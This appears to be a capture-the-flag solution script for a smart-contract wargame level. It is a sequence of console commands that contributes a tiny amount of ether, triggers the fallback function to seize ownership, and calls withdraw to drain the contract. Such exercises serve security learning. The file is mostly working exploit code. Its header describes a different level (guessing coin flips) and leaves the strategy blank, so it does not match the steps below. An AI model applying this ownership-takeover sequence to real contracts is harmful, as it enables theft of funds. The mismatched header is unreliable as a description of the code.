// LEVEL GOALS:
// 1. Guess coin flip correctly 10 times in a row
// -------------------------------
// STRATEGY:
// 1. 
// -------------------------------------------- 
// STEPS TO COMPLETE LEVEL
// -----------------------

// 1 - Contribute < 0.001 ether
await contract.contribute({from: player, value: toWei("0.0009"), gas: 1000000})

// 2 - Call fallback function
// data = some junk value (to call an unknown function)
// value = some positive amount of ether
// from = a sender who has contributed
// to = the contract
await sendTransaction({data: "0x999", from: player, to: instance, value: toWei("0.0001"), gas: 1000000})

// 3 - Check if I pwned the contract
await contract.owner() // I did

// 4 - Call withdraw to steal funds
await contract.withdraw({from: player, gas: 1000000})
